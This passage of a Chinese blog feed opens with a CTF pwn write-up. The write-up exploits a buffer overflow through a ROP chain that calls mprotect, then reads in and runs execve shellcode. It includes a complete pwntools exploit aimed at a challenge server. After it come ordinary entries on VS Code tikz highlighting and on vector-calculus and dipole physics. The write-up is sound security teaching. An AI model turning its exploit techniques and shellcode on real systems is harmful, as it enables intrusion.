class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 100</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> winner[BUFSIZE];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New winner!\nName? &quot;</span>);<br>fgets(winner, <span class="hljs-number">360</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congrats %s\n\n&quot;</span>, winner);<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，由于没有设种，随机数是伪随机数，另写一个程序便可知其随机数序列（要用linux编译运行）,这样我们就可以轻松利用这个漏洞了</p><h2 id="x02-初步分析">0x02 初步分析</h2><p>程序中没有 <code>system()</code> 函数和 <code>/bin/sh</code>字符串，又是静态编译，无法像之前那样通过libc获取，只能使用shellcode了</p><p>但程序中栈不可执行，且无法得知栈的确切位置，只能通过别的方法注入shellcode</p><p>想到用shellcode覆盖一段bss段数据，然后将返回地址覆盖到该段执行shellcode。用gdb的<code>vmmap</code>命令查看，bss段可读可写不可执行，所以要想执行shellcode，就先要把bss段修改为可读可写可执行权限。</p><p>这里需要用到 <code>mprotect()</code> 函数。</p><h2 id="x03-mprotect">0x03 mprotect()</h2><p>linux中 <code>mprotect()</code>可以用来修改一段指定内存区域的保护属性</p><p>函数原型： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span>   </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure></p><p>参数：</p><ul><li><code>start</code>修改权限开始地址，必须是一个内存页的起始地址，一页为<code>0x1000</code></li><li><code>len</code> 修改长度</li><li><code>prot</code> 权限属性<ul><li><code>PROT_READ=4</code> 可读</li><li><code>PROT_WRITE=2</code> 可写</li><li><code>PROT_EXEC=1</code> 可执行</li><li><code>PROT_NONE=0</code> 没有以上三种权限</li></ul></li></ul><p>返回值：</p><ul><li><code>0</code> success</li><li><code>-1</code> fail, 并且系统调用错误码被覆盖</li></ul><p>如果对内存进行不合权限的操作，内核会产生<code>Segmentation fault</code></p><p>这里我们希望bss段可读可写可执行，应将 <code>prot</code> 置为<code>7</code></p><h2 id="x04-pwn-it">0x04 Pwn it！</h2><p>由于是64位程序，传6个以内的参数依次由<code>rdi,rsi,rdx,rcx,r8,r9</code>进行，所以我们首先要找<code>gadget</code> ，即形如 <code>pop rdi;ret</code>的小片段以进行参数传递</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">ROPgadget --binary vuln --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep -E <span class="hljs-string">&quot;rdi|rsi|rdx&quot;</span><br><br>0x0000000000482776 : pop rax ; pop rdx ; pop rbx ; ret<br>0x00000000004026f5 : pop rdi ; pop rbp ; ret<br>0x0000000000400696 : pop rdi ; ret<br>0x000000000047099d : pop rdi ; ret 0xfffd<br>0x000000000044cc24 : pop rdx ; pop r10 ; ret<br>0x0000000000482777 : pop rdx ; pop rbx ; ret<br>0x000000000044cc49 : pop rdx ; pop rsi ; ret<br>0x000000000044cc26 : pop rdx ; ret<br>0x00000000004026f3 : pop rsi ; pop r15 ; pop rbp ; ret<br>0x0000000000400694 : pop rsi ; pop r15 ; ret<br>0x000000000041025e : pop rsi ; pop rbp ; ret<br>0x0000000000410ca3 : pop rsi ; ret<br></code></pre></td></tr></table></figure><p>于是可以在处理好随机数后构造 <code>payload1</code> ，给bss段提权</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">rdi_addr=<span class="hljs-number">0x0000000000400696</span><br>rsi_addr=<span class="hljs-number">0x0000000000410ca3</span><br>rdx_addr=<span class="hljs-number">0x000000000044cc26</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)<br></code></pre></td></tr></table></figure><p>接着在下一轮中用 <code>read</code> 读入shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(<span class="hljs-number">0</span>)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(<span class="hljs-number">29</span>)+p64(read_addr)+p64(main_addr)<br></code></pre></td></tr></table></figure><p>最后再执行shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(shellcode_addr)<br></code></pre></td></tr></table></figure><h2 id="x05-exp">0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ip=<span class="hljs-string">&quot;124.16.75.117&quot;</span><br>port=<span class="hljs-number">51001</span><br>conn=connect(ip,port)<br><span class="hljs-comment">#conn=process(&quot;./pwn/q36_guessing_game_1/vuln&quot;)</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>bss_addr=<span class="hljs-number">0x00000000006BC000</span><br>mprotect_addr=<span class="hljs-number">0x000000000044B480</span><br>buf_size=<span class="hljs-number">0x1000</span><br>buf_prot=<span class="hljs-number">0x7</span><br>rdi_addr=<span class="hljs-number">0x0000000000400696</span><br>rsi_addr=<span class="hljs-number">0x0000000000410ca3</span><br>rdx_addr=<span class="hljs-number">0x000000000044cc26</span><br>return_addr=<span class="hljs-number">0x0000000000400CEE</span><br>main_addr=<span class="hljs-number">0x0000000000400C8C</span><br>write_addr=<span class="hljs-number">0x000000000044A770</span><br>read_addr=<span class="hljs-number">0x000000000044A6A0</span><br>shellcode_addr=<span class="hljs-number">0x00000000006BC554</span><br>shellcode=<span class="hljs-string">b&#x27;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;84&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)<br>conn.sendline(payload1)<br><br><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;87&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(<span class="hljs-number">0</span>)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(<span class="hljs-number">29</span>)+p64(read_addr)+p64(main_addr)<br>conn.sendline(payload2)<br>conn.send(shellcode)<br><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;78&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(shellcode_addr)<br>conn.sendline(payload3)<br>conn.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="x06-其他的做法">0x06 其他的做法</h2><p><ahref="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/">GuessingGame 1 | 7Rocky</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决vscode无法对markdown源码中新定义语言(tikz)高亮的问题</title>
    <link href="/2024/03/08/how-to-use-tikz-in-your-blog/"/>
    <url>/2024/03/08/how-to-use-tikz-in-your-blog/</url>
    
    <content type="html"><![CDATA[<h1id="解决vscode无法对markdown源码中新定义语言tikz高亮的问题">解决vscode无法对markdown源码中新定义语言(tikz)高亮的问题</h1><h2 id="问题原因">问题原因</h2><p>刚刚配置了可用在hexo用于画图的tikz插件（hexo-filter-tikzjax），链接如下：<ahref="https://prinsss.github.io/graphics-with-tikz-in-hexo/">使用 TikZ在 Hexo 博客中愉快地画图</a></p><p>其中插入的代码要这样写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">```tikz</span><br><span class="hljs-code">\begin&#123;document&#125;</span><br><span class="hljs-code">\begin&#123;tikzpicture&#125;</span><br><span class="hljs-code">......</span><br><span class="hljs-code">\end&#123;tikzpicture&#125;</span><br><span class="hljs-code">\end&#123;document&#125;</span><br><span class="hljs-code">```</span><br></code></pre></td></tr></table></figure><p>但这样的话，vscode就无法将其识别为latex语言而不进行高亮，如下图</p><figure><img src="1709906298379.png" alt="无法高亮" /><figcaption aria-hidden="true">无法高亮</figcaption></figure><p>所以必须要修改vscode配置文件</p><h2 id="解决方法">解决方法</h2><p>vscode编辑器的语法高亮储存在 <code>.tmLanguage.json</code>文件中，可以在电脑中搜索 <code>markdown.tmLanguage.json</code>，我们只需要在latex高亮的提示词前面加上tikz即可。</p><figure><img src="1709907723213.png" alt="高亮" /><figcaption aria-hidden="true">高亮</figcaption></figure><p>重启vscode，就可以看到了高亮的代码了。成果图如下</p><figure><img src="1709915675551.png" alt="成果" /><figcaption aria-hidden="true">成果</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>配置问题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>tikz</tag>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数理杂记</title>
    <link href="/2024/03/06/some-math-notes/"/>
    <url>/2024/03/06/some-math-notes/</url>
    
    <content type="html"><![CDATA[<h1 id="数理杂记">数理杂记</h1><h2 id="nabla-运算规则推导"><span class="math inline">\(\nabla\)</span>运算规则推导</h2><p><span class="math display">\[\boldsymbol{def}\quad \varphi, \phi 为标量函数,\boldsymbol{f},\boldsymbol{g} 为矢量函数\]</span></p><p>注意由 <span class="math inline">\(\nabla\)</span>算符的微分性和矢量性，可像正常求导一样写出下一步，在进行矢量运算</p><p><span class="math display">\[\begin{align}\nabla (\varphi \phi)&amp;=\nabla (\varphi_c \phi)+\nabla(\varphi\phi_c)\\&amp;=\varphi\nabla\phi+\phi\nabla\varphi\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \cdot(\varphi \boldsymbol{f})&amp;=\nabla \cdot(\varphi_c\boldsymbol{f})+\nabla \cdot(\varphi \boldsymbol{f}_c) \\&amp;=\varphi\nabla \cdot \boldsymbol{f}+\nabla \varphi \cdot \boldsymbol{f}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \times (\varphi \boldsymbol{f})&amp;=\nabla \times (\varphi_c\boldsymbol{f})+\nabla \times (\varphi \boldsymbol{f}_c) \\&amp;=\varphi\nabla\times \boldsymbol{f}+\nabla \varphi\times \boldsymbol{f}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \cdot (\boldsymbol{f}\times\boldsymbol{g})&amp;=\nabla\cdot(\boldsymbol{f}_c\times\boldsymbol{g})+\nabla\cdot(\boldsymbol{f}\times\boldsymbol{g}_c)\\&amp;=-\boldsymbol{f}_c\cdot(\nabla\times\boldsymbol{g})+\boldsymbol{g}_c(\nabla\times\boldsymbol{f})\\&amp;=-\boldsymbol{f}\cdot(\nabla\times\boldsymbol{g})+\boldsymbol{g}\cdot(\nabla\times \boldsymbol{f})\end{align}\]</span></p><div class="note note-warning">            <p>这个式子第二步化简是用混合积的轮换对称性，将 <spanclass="math inline">\(\nabla\)</span> 作用在该作用的地方，不要出现 <spanclass="math inline">\(\nabla\)</span> 作用在最右边，如 <spanclass="math inline">\(\boldsymbol{f}\cdot(\boldsymbol{g}\times\nabla)\)</span></p>          </div><p><span class="math display">\[\begin{align}\nabla\times (\boldsymbol{f}\times \boldsymbol{g})&amp;=\nabla \times(\boldsymbol{f}_c\times \boldsymbol{g})+\nabla\times(\boldsymbol{f}\times \boldsymbol{g}_c)\\&amp;=(\nabla\cdot\boldsymbol{g})\boldsymbol{f}_c-(\boldsymbol{f}_c\cdot\nabla)\boldsymbol{g}+(\boldsymbol{g}_c\cdot\nabla)\boldsymbol{f}-(\nabla\cdot\boldsymbol{f})\boldsymbol{g}_c\\&amp;= (\nabla\cdot\boldsymbol{g})\boldsymbol{f}-(\boldsymbol{f}\cdot\nabla)\boldsymbol{g}+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}-(\nabla\cdot\boldsymbol{f})\boldsymbol{g}\end{align}\]</span></p><div class="note note-warning">            <p>上面最后一个式子前两项由 <span class="math inline">\(\nabla \times(\boldsymbol{f}_c\times \boldsymbol{g})\)</span> 展开，后两项由 <spanclass="math inline">\(\nabla\times (\boldsymbol{f}\times\boldsymbol{g}_c)\)</span> 展开</p>          </div><p>下面化简如下式子 <spanclass="math inline">\(\nabla(\boldsymbol{f}\cdot\boldsymbol{g})\)</span>，需要有一个引例</p><p>由矢量运算可知</p><p><span class="math display">\[\boldsymbol{A}\times (\boldsymbol{B}\times\boldsymbol{C})=(\boldsymbol{A}\cdot\boldsymbol{C})\boldsymbol{B}-(\boldsymbol{A}\cdot\boldsymbol{B})\boldsymbol{C}\]</span></p><p>那么就有</p><p><span class="math display">\[\boldsymbol{B}(\boldsymbol{A}\cdot \boldsymbol{C})=\boldsymbol{A}\times(\boldsymbol{B}\times \boldsymbol{C})+(\boldsymbol{A}\cdot\boldsymbol{B})\boldsymbol{C}\]</span></p><p>将上式 <spanclass="math inline">\(\boldsymbol{C}=\nabla\)</span>即可得到下述式子</p><p><span class="math display">\[\begin{align}\nabla(\boldsymbol{f}\cdot\boldsymbol{g})&amp;=\nabla(\boldsymbol{f}_c\cdot\boldsymbol{g})+\nabla(\boldsymbol{f}\cdot\boldsymbol{g}_c)\\&amp;=\boldsymbol{f}_c\times(\nabla\times  \boldsymbol{g})+(\boldsymbol{f}_c\cdot\nabla)\boldsymbol{g}+\boldsymbol{g}_c\times(\nabla\times  \boldsymbol{f})+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}\\&amp;=\boldsymbol{f}\times(\nabla\times  \boldsymbol{g})+(\boldsymbol{f}\cdot\nabla)\boldsymbol{g}+\boldsymbol{g}\times(\nabla\times  \boldsymbol{f})+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}\end{align}\]</span></p><h2 id="球坐标系与直角坐标系的变换">球坐标系与直角坐标系的变换</h2><h3 id="坐标变换">坐标变换</h3><p>直角系到球坐标系</p><p><span class="math display">\[\begin{align}x&amp;=r\sin \theta \cos \phi \\ y&amp;=r \sin \theta \sin \phi \\z&amp;=r \cos \theta\end{align}\]</span></p><p>球坐标系到直角坐标系</p><p><span class="math display">\[\begin{align}r&amp;=\sqrt{x^2+y^2+z^2} \\ \theta &amp;=\arccos\frac{z}{\sqrt{x^2+y^2+z^2}} \\ \phi &amp;= \arctan \frac{y}{x}\end{align}\]</span></p><h3 id="基矢变换">基矢变换</h3><p>写出 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>在 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>下的坐标</p><p><span class="math display">\[\begin{align}\boldsymbol{\hat{r}}&amp;=(1,\theta,\phi) \\\boldsymbol{\hat{\theta}}&amp;=(1,\theta+\frac{\pi}{2},\phi) \\\boldsymbol{\hat{\phi}}&amp;=(1,\frac{\pi}{2},\phi+\frac{\pi}{2})\end{align}\]</span></p><p>由此，可以由坐标变换写出 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>到 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>的变换矩阵</p><p><span class="math display">\[\begin{pmatrix} \boldsymbol{\hat{r}} \\ \boldsymbol{\hat{\theta}} \\\boldsymbol{\hat{\phi}} \\\end{pmatrix} =\begin{pmatrix} \sin \theta \cos \phi &amp; \sin \theta \sin \phi&amp;  \cos \theta \\ \cos \theta \cos \phi &amp; \cos \theta \sin \phi&amp; -\sin \theta \\ -\sin \phi &amp; \cos \phi &amp; 0 \\\end{pmatrix}\begin{pmatrix} \boldsymbol{\hat{x}} \\ \boldsymbol{\hat{y}} \\\boldsymbol{\hat{z}} \\\end{pmatrix}\]</span></p><p>要求从 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>到 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>的变换，即求上述矩阵的逆</p><p>由于该矩阵式正交的，所以 <spanclass="math inline">\(A^{-1}=A^{\mathrm{T}}\)</span> （<ahref="https://zhuanlan.zhihu.com/p/684677360">通俗易懂：什么是正交矩阵</a>）</p><p>则有</p><p><span class="math display">\[\begin{pmatrix} \boldsymbol{\hat{x}} \\ \boldsymbol{\hat{y}} \\\boldsymbol{\hat{z}} \\\end{pmatrix}=\begin{pmatrix} \sin \theta \cos\phi &amp; \cos \theta \cos \phi &amp; -\sin \phi   \\ \sin \theta \sin\phi &amp; \cos \theta \sin \phi  &amp; \cos \phi \\ \cos \theta &amp;-\sin \theta &amp; 0 \\\end{pmatrix} \begin{pmatrix}\boldsymbol{\hat{r}} \\ \boldsymbol{\hat{\theta}} \\\boldsymbol{\hat{\phi}} \\\end{pmatrix}\]</span></p><h2 id="三维正交曲线坐标系-uvw-的梯度散度旋度">三维正交曲线坐标系 <spanclass="math inline">\((u,v,w)\)</span> 的梯度、散度、旋度</h2><h3 id="前置内容">前置内容</h3><p>现在我们用 <span class="math inline">\((u,v,w)\)</span>来代替直角坐标系中的 <span class="math inline">\((x, y, z)\)</span>、球坐标系中的 <span class="math inline">\((r,\theta,\phi)\)</span>、柱坐标系的 <span class="math inline">\((s,\theta,z)\)</span>，以得到普遍性的结果。其中这三个单位矢量正交，且 <spanclass="math inline">\(\boldsymbol{\hat{u}},\boldsymbol{\hat{v}},\boldsymbol{\hat{w}}\)</span>指坐标增加的方向。值得注意的是，这三个单位矢量都是位置的函数，因为其方向随坐标的变化而变化。由此，我们可以给出从<span class="math inline">\((u,v,w)\)</span> 到 <spanclass="math inline">\((u+\mathrm{d}u,v+\mathrm{d}v,w+\mathrm{d}w)\)</span>的无穷小位移</p><p><span class="math display">\[\mathrm{d}\boldsymbol{l}=f\mathrm{d}u \boldsymbol{\hat{u}}+g\mathrm{d}v\boldsymbol{\hat{v}}+h\mathrm{d}w \boldsymbol{\hat{w}}\]</span></p><p>其中 <span class="math inline">\(f,g,h\)</span>是描述单位矢量随坐标变化的函数。</p><div class="note note-success">            <p>例如，直角坐标系是 <span class="math inline">\((1,1,1)\)</span>，而球坐标系是 <span class="math inline">\((1,r,r\sin\theta)\)</span></p>          </div><h3 id="梯度">梯度</h3><p>现在假设有一个标量场 <span class="math inline">\(t(u,v,w)\)</span>，当有一个点位移了一个 <spanclass="math inline">\(\mathrm{d}\boldsymbol{l}\)</span> 时，标量场 <spanclass="math inline">\(t\)</span> 有变化</p><p><span class="math display">\[\mathrm{d}t=\frac{\partial t}{\partial u}\mathrm{d}u+\frac{\partialt}{\partial v}\mathrm{d}v+\frac{\partial t}{\partial w}\mathrm{d}w\]</span></p><p>由梯度的定义可知，</p><p><span class="math display">\[\mathrm{d}t=\nabla t \cdot \mathrm{d}\boldsymbol{l}=(\nabla t)_uf\mathrm{d}u+(\nabla t)_v g\mathrm{d}v+(\nabla t)_w h\mathrm{d}w\]</span></p><p>其中 <span class="math inline">\((\nabla t)_u\)</span> 为 <spanclass="math inline">\(t\)</span> 的梯度在 <spanclass="math inline">\(\boldsymbol{\hat{u}}\)</span> 方向的分量</p><p>对比前两式，我们可得</p><p><span class="math display">\[(\nabla t)_u=\frac{1}{f}\frac{\partial t}{\partial u},\quad(\nablat)_v=\frac{1}{g}\frac{\partial t}{\partial v},\quad(\nablat)_w=\frac{1}{h}\frac{\partial t}{\partial w}\]</span></p><p>即梯度为</p><p><span class="math display">\[\nabla t=\frac{1}{f}\frac{\partial t}{\partialu}\boldsymbol{\hat{u}}+\frac{1}{g}\frac{\partial t}{\partialv}\boldsymbol{\hat{v}}+\frac{1}{h}\frac{\partial t}{\partialw}\boldsymbol{\hat{w}}\]</span></p><h3 id="散度">散度</h3><p>现在假定有一个矢量场 <spanclass="math display">\[\boldsymbol{A}(u,v,w)=A_u\boldsymbol{\hat{u}}+A_v \boldsymbol{\hat{v}}+A_w\boldsymbol{\hat{w}}\]</span></p><p>由散度定理可得，</p><p><span class="math display">\[\oint \boldsymbol{A}\cdot \mathrm{d}\boldsymbol{a}=\int \nabla \cdot\boldsymbol{A} \mathrm{d}\tau\]</span></p><p>有正交性可知，一无限小体元近似于一正方体。我们取一小体元及其表面分析，</p><figure><img src="sandu.jpg" alt="小体元" /><figcaption aria-hidden="true">小体元</figcaption></figure><p>小体元的三个边长为</p><p><span class="math display">\[\begin{align}\mathrm{d}l_u&amp;=f\mathrm{d}u\\\mathrm{d}l_v&amp;=g\mathrm{d}v\\\mathrm{d}l_w&amp;=h\mathrm{d}w\end{align}\]</span></p><p>由此易知体元体积 <spanclass="math inline">\(\mathrm{d}\tau\)</span></p><p><span class="math display">\[\mathrm{d}\tau=(fgh) \mathrm{d}u \mathrm{d}v \mathrm{d}w\]</span></p><p>和前面面元矢量</p><p><span class="math display">\[\mathrm{d}\boldsymbol{a}=-(gh)\mathrm{d}v\mathrm{d}w\]</span></p><p>则前面的通量为</p><p><span class="math display">\[\boldsymbol{A}\cdot\mathrm{d}\boldsymbol{a}=-(ghA_u)\mathrm{d}v\mathrm{d}w\]</span></p><p>由于 <span class="math inline">\(A_u,g,h\)</span> 都是关于位置 <spanclass="math inline">\((u,v,w)\)</span>的函数，因此其前后面不一样，要一起算偏微分。前后两面的通量为</p><p><span class="math display">\[\frac{\partial (ghA_u)}{\partial u}\mathrm{d}u\mathrm{d}v\mathrm{d}w=\frac{1}{fgh}\frac{\partial (ghA_u)}{\partialu}\mathrm{d}\tau\]</span></p><p>对左右、上下侧面做此操作，则可以得</p><p><span class="math display">\[\oint \boldsymbol{A}\cdot \mathrm{d}\boldsymbol{a}=\int\frac{1}{fgh}\left(\frac{\partial (ghA_u)}{\partial u}+\frac{\partial(fhA_v)}{\partial v}+\frac{\partial (fgA_w)}{\partial w}\right)\mathrm{d}\tau\]</span></p><p>那么 <span class="math inline">\(\boldsymbol{A}\)</span>的散度即为</p><p><span class="math display">\[\nabla \cdot \boldsymbol{A}=\frac{1}{fgh}\left(\frac{\partial(ghA_u)}{\partial u}+\frac{\partial (fhA_v)}{\partial v}+\frac{\partial(fgA_w)}{\partial w} \right)\]</span></p><h3 id="旋度">旋度</h3><h2 id="电偶极子">电偶极子</h2><h3 id="电偶极子在-rtheta-产生的电势电场">电偶极子在 <spanclass="math inline">\((r,\theta)\)</span> 产生的电势、电场</h3><p><span class="math display">\[\begin{align}\varphi&amp;=\frac{q}{4\pi \varepsilon_0}\left(\frac{1}{\sqrt{r^2+\frac{l^2}{4}-rl\cos\theta}}-\frac{1}{\sqrt{r^2+\frac{l^2}{4}+rl\cos\theta}}\right)\\&amp;=\frac{q}{4\pi\varepsilon_0r}\left(1+\frac{l}{2r}\cos\theta-1+\frac{l}{2r}\cos\theta\right)\\&amp;=\frac{q}{4\pi\varepsilon_0r}\cdot\frac{l\cos\theta}{r}\\&amp;=\frac{\boldsymbol{p}\cdot\boldsymbol{\hat{r}}}{4\pi\varepsilon_0r^2}\end{align}\]</span></p><p><span class="math display">\[\boldsymbol{E_r}=-\frac{\partial \varphi}{\partial r} =\frac{\boldsymbol{p}\cdot \boldsymbol{\hat{r}}}{2\pi\varepsilon_0r^3}\]</span></p><p><span class="math display">\[\begin{align}\boldsymbol{E_\theta}&amp;=-\frac{\partial \varphi}{r\partial \theta} \\&amp;=\frac{p \sin\theta}{4\pi\varepsilon_0r^3}\\&amp;=\frac{(\boldsymbol{p}\times \boldsymbol{\hat{r}})\times\boldsymbol{\hat{r}}}{4\pi\varepsilon_0r^3}=\frac{(\boldsymbol{p}\cdot\boldsymbol{\hat{r}})\boldsymbol{\hat{r}}-\boldsymbol{p}}{4\pi\varepsilon_0r^3}\end{align}\]</span></p><h3id="电偶极子在外场中能量受力受力矩">电偶极子在外场中能量、受力、受力矩</h3><p><span class="math display">\[\begin{align}E_p&amp;=-q\varphi_- +q\varphi_- \\&amp;=q(\varphi_+-\varphi_-)\\&amp;=q(\boldsymbol{l}\cdot\nabla\varphi)\\&amp;=-\boldsymbol{p}\cdot \boldsymbol{E}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\boldsymbol{F}&amp;=-\nabla E_p \\&amp;=\nabla(\boldsymbol{p}\cdot\boldsymbol{E})\\&amp;=(\boldsymbol{p}\cdot\nabla)\boldsymbol{E}+\boldsymbol{p}\times (\nabla\times\boldsymbol{E})+(\boldsymbol{E}\cdot\nabla)\boldsymbol{p}+\boldsymbol{E}\times (\nabla\times\boldsymbol{p})\\&amp;=(\boldsymbol{p}\cdot \nabla)\boldsymbol{E}\end{align}\]</span></p><p>可见，若外场均匀，则合外力为零</p><p>对于受到的力矩，可以先以偶极子中点为基点</p><div class="note note-warning">            <p>下面有一个矢量图，如果使用夜晚模式可能会导致观感变差</p>          </div><!-- tikzjax-placeholder-4571484d22912add492185c91662e3de --><p><span class="math display">\[\begin{align}\boldsymbol{M&#39;}&amp;=q\left(\frac{\boldsymbol{l}}{2}\times\boldsymbol{E_+}\right)-q\left(\frac{-\boldsymbol{l}}{2}\times\boldsymbol{E_-} \right) \\&amp;=q\left(\frac{\boldsymbol{l}}{2}\times(\boldsymbol{E_+}+\boldsymbol{E_-}) \right)\\&amp;=\boldsymbol{p}\times\boldsymbol{E}\end{align}\]</span></p><p>再写成对任一点的形式</p><p><span class="math display">\[\begin{align}\boldsymbol{M}&amp;=\boldsymbol{M&#39;}+\boldsymbol{r}\times\boldsymbol{F} \\&amp;=\boldsymbol{p}\times\boldsymbol{E}+\boldsymbol{r}\times (\boldsymbol{p}\cdot\nabla)\boldsymbol{E}\end{align}\]</span></p><p>其中 <span class="math inline">\(\boldsymbol{r}\)</span>为偶极子相对于基点的位矢</p><p>可以看到的是，如果场是均匀的，那么其受外力矩就是 <spanclass="math 